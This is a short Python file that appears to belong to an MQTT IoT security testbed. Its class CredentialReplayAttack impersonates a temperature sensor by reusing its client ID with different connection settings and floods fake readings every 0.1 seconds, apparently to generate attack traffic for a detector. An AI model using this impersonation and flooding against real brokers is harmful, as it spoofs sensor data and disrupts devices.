import time
import json
from devices.base_device import BaseDevice

class CredentialReplayAttack(BaseDevice):
    def __init__(self, target_client_id, host='localhost', port=1883):
        # Uses the target's client_id but completely different connect signature 
        # (e.g. clean_session=False instead of True, keepalive=10 instead of 60)
        super().__init__(target_client_id, host, port, keepalive=10, clean_session=False)

    def run(self, count=None):
        print(f"[*] ATTACK: Launching credential replay as {self.client_id}")
        self.connect()
        self._running = True
        sent = 0
        while self._running and (count is None or sent < count):
            # Spams messages (different behavioral signature than normal temperature sensor)
            payload = json.dumps({"value": 100})
            self.client.publish(f"sensors/temp/{self.client_id}", payload, qos=0)
            sent += 1
            time.sleep(0.1) # Rapid spam
        self.disconnect()
